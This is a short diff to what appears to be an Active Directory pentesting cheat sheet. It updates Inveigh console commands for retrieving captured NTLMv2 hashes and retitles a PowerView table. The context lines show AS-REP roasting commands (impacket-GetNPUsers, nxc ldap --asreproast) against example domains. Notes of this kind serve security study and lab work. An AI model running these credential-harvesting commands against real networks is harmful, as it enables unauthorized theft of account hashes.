@@ -67,9 +67,9 @@ while running the tool. The console gives us access to captured credentials/hash
 us to stop Inveigh, and more.
 """
 > Console CMDs
-HELP
-GET NTLMV2UNIQUE
-GET NTLMV2USERNAMES
+Get-Help Invoke-Inveigh
+Get-Inveigh -NTLMv2Unique
+Get-Inveigh -NTLMv2
 
 ```
 
@@ -232,7 +232,7 @@ impacket-GetNPUsers fusion.corp/ -usersfile users.txt -no-pass -request
 nxc ldap SYSCO.LOCAL -u users.txt -p '' --asreproast output.txt
 ```
 
-**Power View**
+**Power View Table** 
 
 | **Command**                         | **Description**                                                                            |
 | ----------------------------------- | ------------------------------------------------------------------------------------------ |
